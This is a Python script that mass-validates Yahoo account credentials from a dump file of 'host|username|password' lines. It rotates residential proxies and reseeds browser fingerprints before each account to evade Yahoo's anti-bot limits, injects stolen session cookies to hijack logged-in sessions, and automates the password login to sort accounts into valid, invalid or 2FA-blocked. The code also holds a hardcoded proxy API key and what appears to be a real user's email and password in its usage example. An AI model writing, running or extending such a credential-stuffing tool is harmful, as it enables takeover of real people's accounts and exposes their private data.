#!/usr/bin/env python3
"""Validate Yahoo account credentials from a host|username|password dump, using bdg + CloakBrowser.

Input format (one per line):
    https://login.yahoo.com/account/challenge/password|user@yahoo.com|password

For each account the script:
  1. Rotates to a FloppyData rotating proxy and reseeds the profile fingerprint
     before every credential (to avoid Yahoo anti-bot / rate-limiting), then
     relaunches and reconnects bdg.
  2. Tries session-cookie injection -- if a matching cookie bundle exists under
     --cookies-dir (files with a "cookies" list of {domain,name,value} dicts),
     it injects them and checks whether the browser lands on an authenticated
     Yahoo page. If yes -> status "session".
  3. Otherwise it performs the Yahoo password login flow:
       * navigate login.yahoo.com/?lang=en-US
       * fill #username -> click Next
       * fill #login-passwd -> click Next
     and classifies the result:
       * valid        -> redirected to mail/www.yahoo.com (authenticated)
       * invalid      -> /account/challenge/fail , "could not sign you in"
       * needs_2fa    -> OTP / verification step blocks
       * not_yahoo    -> page isn't the expected login form
  4. Captures bounded page HTML after each attempt (--html-dump).

Passwords are never echoed to stdout (only usernames / the credentials you pass).

Usage examples
--------------
    export CBPM_API_URL=https://clk.mrme.tech
    export CBPM_API_TOKEN=...          # from ~/.cbpm/config.json if unset

    # Single account
    python3 scripts/check_yahoo_creds.py \\
        --user nilesh_banjare@yahoo.com --pass 'yuvaan@007' --profile w

    # Full dump file, with proxy rotation + cookie injection + HTML dumps
    python3 scripts/check_yahoo_creds.py \\
        --file /Volumes/Untitled/cookies/data/0809/yahoo_creds.txt \\
        --cookies-dir /Volumes/Untitled/cookies/data/0809/yahoo \\
        --profile w --delay 3 \\
        --out scripts/logs/yahoo_results.csv \\
        --html-dump scripts/logs/yahoo_ui_refinement
"""

from __future__ import annotations

import argparse
import glob
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
LOGIN_URL = "https://login.yahoo.com/?lang=en-US"
DEFAULT_PROFILE = "w"
DEFAULT_TIMEOUT = 45
SETTLE_SECONDS = 10

# Failure / status markers (lowercased body text)
COULD_NOT_SIGN_IN = ("could not sign you in", "we could not sign you in",
                     "something went wrong", "incorrect password", "invalid password",
                     "wrong password", "password you entered", "account doesn't exist",
                     "no account found", "unable to sign")
CAPTCHA_MARKERS = ("captcha", "verify you are human", "unusual activity",
                   "security check", "blocked", "too many", "try again in")
VERIFY_MARKERS = ("verification code", "enter the code", "one time password",
                  "otp", "verify your identity", "recovery", "challenge")
# Post-login authenticated Yahoo destinations.
AUTH_DOMAINS = ("mail.yahoo.com", "www.yahoo.com", "login.yahoo.com/account/security",
                "yahoo.com/?", "us-mg", "outlook.live.com/.mail")


# ---------------------------------------------------------------------------
# FloppyData proxy + fingerprint reseed
# ---------------------------------------------------------------------------
FLOPPY_BASE_URL = "https://api.floppydata.net"
FLOPPY_API_KEY = os.environ.get("FLOPPY_API_KEY", "1yAYInu2blMyOhSnCmwSYEET-nvAxGx8")
FLOPPY_CREDENTIAL_ID = "2314b312-a432-411f-a7e7-2f17414b3e56"


def fetch_floppy_proxy():
    url = f"{FLOPPY_BASE_URL}/v2/proxy/rotating/connections"
    body = json.dumps({
        "type": "residential", "country": "US", "city": "New York",
        "rotation": 15, "protocol": "socks5",
    }).encode()
    req = urllib.request.Request(
        url, data=body,
        headers={"Content-Type": "application/json", "X-Api-Key": FLOPPY_API_KEY,
                 "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.loads(resp.read().decode())["connection"]["connectionString"]
    except Exception as exc:
        print(f"  [proxy] FloppyData API unavailable ({exc}); using saved CBM credential",
              file=sys.stderr)
        return None


def rotate_profile(profile, use_floppy=True):
    if use_floppy:
        proxy = fetch_floppy_proxy()
        if proxy:
            run_bdg(["cloak", "profile", "proxy", profile, "--url", proxy], check=False)
        else:
            run_bdg(["cloak", "profile", "proxy", profile,
                     "--credential", FLOPPY_CREDENTIAL_ID], check=False)
    run_bdg(["cloak", "profile", "reseed", profile], check=False)
    run_bdg(["cloak", "stop", profile], check=False)
    time.sleep(4)
    run_bdg(["cloak", "launch", profile], check=False)
    time.sleep(8)
    run_bdg(["cloak", "connect", profile, "about:blank"], check=False)
    time.sleep(8)


# ---------------------------------------------------------------------------
# bdg helpers
# ---------------------------------------------------------------------------
def run_bdg(args, json_output=False, check=True):
    cmd = ["bdg", *args]
    if json_output:
        cmd.append("--json")
    result = subprocess.run(cmd, capture_output=True, text=True, check=check)
    if json_output:
        return json.loads(result.stdout)
    return result.stdout


def domeval(expression):
    raw = run_bdg(
        ["cdp", "Runtime.evaluate", "--params",
         json.dumps({"expression": expression, "awaitPromise": False, "returnByValue": True})],
        check=False,
    )
    try:
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return ""


def current_page_signals():
    expr = ("({ url: window.location.href, title: document.title, "
            "body: document.body ? document.body.innerText.trim().slice(0, 1500) : '' })")
    raw = run_bdg(
        ["cdp", "Runtime.evaluate", "--params",
         json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True})],
        check=False,
    )
    try:
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return {"url": "", "title": "", "body": ""}


def navigate(url, settle=SETTLE_SECONDS):
    run_bdg(["cdp", "Page.navigate", "--params", json.dumps({"url": url})], check=False)
    time.sleep(settle)


def clear_session():
    run_bdg(["cdp", "Network.clearBrowserCookies"], check=False)
    clear_storage = ("(() => { try { localStorage.clear(); } catch (e) {} "
                     "try { sessionStorage.clear(); } catch (e) {} "
                     "return 'cleared'; })()")
    run_bdg(["cdp", "Runtime.evaluate", "--params",
             json.dumps({"expression": clear_storage, "awaitPromise": False, "returnByValue": True})],
            check=False)


def fill_field(selector, value):
    sel = selector.lstrip("#")
    expr = f"""
(() => {{
  let el = document.querySelector({json.dumps(selector)});
  if (!el) el = document.querySelector('[name={json.dumps(sel)}], [id={json.dumps(sel)}]');
  if (!el) throw new Error('Element not found: ' + {json.dumps(selector)});
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
  el.focus();
  setter.call(el, {json.dumps(value)});
  el.dispatchEvent(new Event('input', {{ bubbles: true }}));
  el.dispatchEvent(new Event('change', {{ bubbles: true }}));
  el.blur();
  return el.value;
}})()
"""
    run_bdg(["cdp", "Runtime.evaluate", "--params",
             json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True})],
            check=False)


def element_visible(selector):
    expr = f"""(() => {{
      const e = document.querySelector({json.dumps(selector)});
      if (!e) return 'no';
      const r = e.getBoundingClientRect();
      const cs = getComputedStyle(e);
      return (r.width > 0 && r.height > 0 && cs.visibility !== 'hidden' && cs.display !== 'none') ? 'yes' : 'no';
    }})()"""
    return domeval(expr).strip() == "yes"


def wait_for_visible(selector, timeout, poll=0.8):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if element_visible(selector):
            return True
        time.sleep(poll)
    return False


def click_button(text_regex):
    expr = f"""(() => {{
      const re = new RegExp({json.dumps(text_regex)}, "i");
      const btns = Array.from(document.querySelectorAll('button')).filter(b => {{
        const r = b.getBoundingClientRect();
        const cs = getComputedStyle(b);
        return r.width > 0 && r.height > 0 && cs.visibility !== 'hidden' && cs.display !== 'none'
               && re.test((b.textContent||'').trim());
      }});
      if (btns.length) {{ btns[0].click(); return 'clicked'; }}
      return 'none';
    }})()"""
    return domeval(expr).strip() == "clicked"


def capture_html(dump_dir, username, tag):
    if not dump_dir:
        return ""
    try:
        expr = "(() => { const h = document.documentElement ? document.documentElement.outerHTML : ''; return h.slice(0, 6000); })()"
        raw = run_bdg(["dom", "eval", expr], check=False)
        if raw.startswith("(node:"):
            raw = raw[raw.find("\\n") + 1:]
        html = json.loads(raw) if raw.strip() else ""
    except Exception:
        html = ""
    if not html:
        return ""
    os.makedirs(dump_dir, exist_ok=True)
    safe_user = re.sub(r"[^A-Za-z0-9._@-]", "_", username)[:40]
    fname = f"yahoo__{safe_user}__{tag}.html"
    meta = {"url": domeval("location.href"), "title": domeval("document.title")}
    with open(os.path.join(dump_dir, fname), "w", encoding="utf-8") as fh:
        fh.write("<!-- captured_at=" + time.strftime("%Y-%m-%dT%H:%M:%S")
                 + " doc=" + json.dumps(meta) + " -->\n")
        fh.write(html)
    return fname

# ---------------------------------------------------------------------------
# Cookie / session helpers
# ---------------------------------------------------------------------------
def find_cookie_file(cookies_dir, username):
    if not cookies_dir or not os.path.isdir(cookies_dir):
        return None
    base = os.path.basename(username).lower()
    for f in sorted(glob.glob(os.path.join(cookies_dir, "*.json"))):
        fn = os.path.basename(f).lower()
        base_fn = fn[:-5]
        if base_fn.endswith("_" + base):
            try:
                d = json.load(open(f))
                if d.get("credential", {}).get("username", "").lower() == username.lower():
                    return f
            except Exception:
                continue
    return None


def load_cookies(cookies_dir, username):
    f = find_cookie_file(cookies_dir, username)
    if not f:
        return None, None
    try:
        d = json.load(open(f))
        return d.get("cookies", []), f
    except Exception:
        return None, None


def inject_cookies(cookies):
    if not cookies:
        return False
    try:
        run_bdg(["cdp", "Network.setCookies", "--params",
                 json.dumps({"cookies": cookies})], check=False)
        return True
    except Exception:
        return False


def is_authenticated(signals):
    url = (signals.get("url") or "").lower()
    title = (signals.get("title") or "").lower()
    body = (signals.get("body") or "").lower()
    # Hard reject login pages.
    if "login.yahoo.com" in url and "/challenge/" not in url:
        return False
    if "sign in to yahoo" in title or "sign in to your account" in body:
        return False
    if any(m in url for m in AUTH_DOMAINS):
        return True
    # Yahoo mail redirects to the inbox after auth.
    if "mail.yahoo.com" in url:
        return True
    if ("sign out" in body or "my account" in body) and "sign in" not in body[:200]:
        return True
    return False


def session_check(username, cookies_dir, host_url=None):
    cookies, src = load_cookies(cookies_dir, username)
    if cookies is None:
        return None, None
    clear_session()
    inject_cookies(cookies)
    target = host_url or "https://login.yahoo.com/?lang=en-US"
    navigate(target, settle=8)
    sig = current_page_signals()
    if is_authenticated(sig):
        return "session", {"cookie_file": os.path.basename(src)}
    return "cookie_fail", {"cookie_file": os.path.basename(src)}


# ---------------------------------------------------------------------------
# Yahoo password login
# ---------------------------------------------------------------------------
def classify_result(sig):
    url = (sig.get("url") or "").lower()
    body = (sig.get("body") or "").lower()

    if is_authenticated(sig):
        return "valid", None
    if "/challenge/fail" in url or any(m in body for m in COULD_NOT_SIGN_IN):
        return "invalid", "could-not-sign-in"
    # Yahoo verification / 2FA challenge requests (password may be correct).
    if "/challenge-selector" in url or "/challenge/" in url:
        return "needs_2fa", "verification-challenge"
    if any(m in body for m in VERIFY_MARKERS):
        return "needs_2fa", "verification"
    if any(m in body for m in CAPTCHA_MARKERS):
        return "bot", "captcha/anti-bot"
    return "unknown", None



def wait_for_url_change(from_fragment, timeout):
    """Wait until the URL no longer contains from_fragment (or timeout)."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        url = (current_page_signals().get("url") or "")
        if from_fragment not in url:
            return True
        time.sleep(1.5)
    return False

def password_login(username, password, timeout):
    """Yahoo password login. Returns (status, detail)."""
    clear_session()
    navigate(LOGIN_URL, settle=8)

    if not wait_for_visible("#username", timeout=timeout):
        return "not_yahoo", "no username field"
    time.sleep(2)

    # Step 1: username -> Next.
    fill_field("#username", username)
    time.sleep(2)
    if not click_button(r"^next$"):
        try:
            run_bdg(["dom", "pressKey", "#username", "Enter"], check=False)
        except Exception:
            pass
    time.sleep(8)

    # Step 2: wait for password field, fill, submit.
    if not wait_for_visible("#login-passwd", timeout=timeout):
        sig = current_page_signals()
        return classify_result(sig)
    time.sleep(2)

    fill_field("#login-passwd", password)
    time.sleep(2)
    if not click_button(r"^next$"):
        try:
            run_bdg(["dom", "pressKey", "#login-passwd", "Enter"], check=False)
        except Exception:
            pass
    # Wait for the login to resolve (Yahoo can take 10-15s to authenticate).
    wait_for_url_change("account/challenge/password", timeout=timeout)
    time.sleep(3)

    sig = current_page_signals()
    return classify_result(sig)


# ---------------------------------------------------------------------------
# Input parsing
# ---------------------------------------------------------------------------
def load_creds_file(path):
    rows = []
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for raw in fh:
            line = raw.rstrip("\n")
            if not line.strip():
                continue
            parts = line.split("|")
            if len(parts) >= 3:
                url, username, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
                if url and username:
                    rows.append((url, username, password))
    return rows

def main():
    parser = argparse.ArgumentParser(
        description="Validate Yahoo account creds via CloakBrowser (proxy rotation + cookies + password login)"
    )
    parser.add_argument("--user", help="Yahoo username/email")
    parser.add_argument("--pass", dest="password", help="Yahoo password")
    parser.add_argument("--file", type=str, help="Dump file of host|username|password lines")
    parser.add_argument("--cookies-dir", default="", help="Dir with per-account cookie JSON bundles")
    parser.add_argument("--profile", default=DEFAULT_PROFILE, help="CBM profile (default: %(default)s)")
    parser.add_argument("--out", default="", help="Write results to this CSV file")
    parser.add_argument("--html-dump", default="", help="Dir to save each page HTML for refinement")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="Per-attempt timeout")
    parser.add_argument("--delay", type=float, default=3.0, help="Seconds between credentials")
    parser.add_argument("--no-cookies", action="store_true", help="Skip cookie injection")
    parser.add_argument("--no-proxy-rotate", action="store_true", help="Do not rotate proxy/reseed before each credential")
    args = parser.parse_args()

    if args.user and args.password:
        creds = [("https://login.yahoo.com/", args.user, args.password)]
    elif args.file:
        creds = load_creds_file(args.file)
    else:
        parser.error("Provide --user/--pass OR --file")

    if not creds:
        print("No credentials to check.", file=sys.stderr)
        return 1

    print(f"Checking {len(creds)} Yahoo account(s) via profile '{args.profile}' ...")

    try:
        run_bdg(["cloak", "connect", args.profile, "about:blank"], json_output=False, check=True)
    except subprocess.CalledProcessError as exc:
        print(f"Could not connect to profile '{args.profile}': {exc}", file=sys.stderr)
        return 1
    time.sleep(4)

    results = []
    for i, (url, username, password) in enumerate(creds, start=1):
        print(f"[{i}/{len(creds)}] {username} ...", flush=True)

        if not args.no_proxy_rotate:
            try:
                rotate_profile(args.profile)
            except Exception as exc:
                print(f"    [proxy] rotation failed: {exc}", file=sys.stderr)

        status, detail = None, None
        if not args.no_cookies and args.cookies_dir:
            status, detail = session_check(username, args.cookies_dir, url)
            if status == "session":
                capture_html(args.html_dump, username, "session")
                print(f"    -> session (cookies)")
                results.append((username, "session", "cookie-session"))
                time.sleep(args.delay)
                continue
            if status == "cookie_fail":
                print(f"    cookies present but session invalid (likely expired)")

        try:
            status, detail = password_login(username, password, args.timeout)
        except Exception as exc:
            status, detail = "error", f"{type(exc).__name__}: {exc}"
        capture_html(args.html_dump, username, status)
        reason = detail or ""
        print(f"    -> {status}" + (f" ({reason})" if reason else ""))
        results.append((username, status, reason))
        time.sleep(args.delay)

    print("\n=== Summary ===")
    for username, status, reason in results:
        print(f"{status.upper():14} {username}" + (f"  ({reason})" if reason else ""))

    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write("username,status,reason\n")
            for username, status, reason in results:
                fh.write(f"{username},{status},{reason}\n")
        print(f"Results written to {args.out}")

    if args.html_dump:
        print(f"HTML snapshots saved to: {args.html_dump}")

    valid_count = sum(1 for _, s, _ in results if s in ("valid", "session"))
    print(f"\nVALID/session: {valid_count}/{len(results)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
